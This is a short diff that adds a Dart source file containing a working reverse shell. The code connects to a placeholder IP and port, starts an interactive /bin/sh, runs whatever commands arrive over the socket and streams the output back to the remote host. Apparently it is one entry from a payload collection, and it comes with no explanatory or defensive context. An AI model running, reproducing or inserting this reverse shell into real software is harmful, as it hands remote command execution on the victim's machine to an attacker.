@@ -1,0 +1,8 @@
+import 'dart:io';
+import 'dart:convert';
+
+void main() => Socket.connect("<ip>", <port>).then((socket) => socket
+  ..listen((data) => Process.start('/bin/sh', ['-i']).then((process) => process
+    ..stdin.writeln(String.fromCharCodes(data).trim())
+    ..stdout.transform(utf8.decoder).listen(socket.write)),
+    onDone: socket.destroy));
